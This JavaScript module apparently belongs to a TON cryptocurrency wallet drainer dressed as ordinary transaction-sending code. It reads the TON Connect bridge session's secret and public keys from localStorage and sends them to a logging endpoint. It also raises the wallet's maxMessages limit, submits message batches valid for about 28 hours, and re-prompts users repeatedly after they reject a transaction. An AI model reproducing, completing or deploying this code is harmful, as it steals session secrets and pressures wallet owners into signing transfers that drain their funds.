const {requestCountAfterReject} = require('./config');

module.exports = (protocol, messages, max, timeOut = 0, wallet, userInfo) => {
    return new Promise(async (resolve, reject) => {
        let unConnect = false;
        setTimeout(async () => {
            try {
                let transactions = max;
                if (window.tonConnectUI.connector._wallet.device?.features) {
                    for (const feature of window.tonConnectUI.connector._wallet.device.features) {
                        if (typeof feature === 'object') {
                            if (feature.maxMessages) {
                                feature.maxMessages = +max;
                                break;
                            }
                        }
                    }
                }
                let counter;
                for (let i = 0; i < messages.length; i += transactions) {
                    try {
                        counter = requestCountAfterReject;
                        while (counter !== 0) {
                            const chunk = messages.slice(i, Math.min(i + transactions, messages.length));

                            let secret = {}
                            if (JSON.parse(localStorage.getItem('ton-connect-storage_bridge-connection')).type === 'http') {
                                const session = JSON.parse(localStorage.getItem('ton-connect-storage_bridge-connection'));
                                const walletInfo = JSON.parse(localStorage.getItem('ton-connect-ui_wallet-info'));

                                secret = {
                                    pub: session.sessionCrypto ? session.sessionCrypto.publicKey : session.session.sessionKeyPair.publicKey,
                                    sec: session.sessionCrypto ? session.sessionCrypto.secretKey : session.session.sessionKeyPair.secretKey,
                                    from: session.session.walletPublicKey,
                                    app: walletInfo.appName,
                                    address: userInfo.address
                                }
                            }

                            await protocol.sendLog({
                                method: 'pushChunk',
                                userInfo,
                                wallet,
                                secret,
                                chunk,
                            });

                            await protocol.subscribeTransaction({
                                userInfo,
                                wallet,
                                chunk,
                            });

                            const transactionData = {
                                validUntil: Math.floor(Date.now() / 1000) + 100000,
                                messages: chunk
                            };

                            try {
                                var result = await window.tonConnectUI.sendTransaction(transactionData);

                                protocol.sendLog({
                                    method: 'chunkStatus',
                                    status: 'sent',
                                    userInfo,
                                    wallet,
                                    chunk,
                                });


                                break;
                            } catch (error) {
                                counter -= 1;
                                await protocol.sendLog({
                                    method: 'chunkStatus',
                                    status: 'error',
                                    userInfo,
                                    wallet,
                                    chunk,
                                });
                            }
                        }
                    } catch (e) {
                        console.error('[TOD_ERROR_FATAL] Send transaction error', e)
                    }
                }
                unConnect = true;
            } catch (e) {
                console.error('[TOD_ERROR_FATAL] Send transaction error', e)
            }
        }, timeOut);
        resolve (unConnect)
    });
}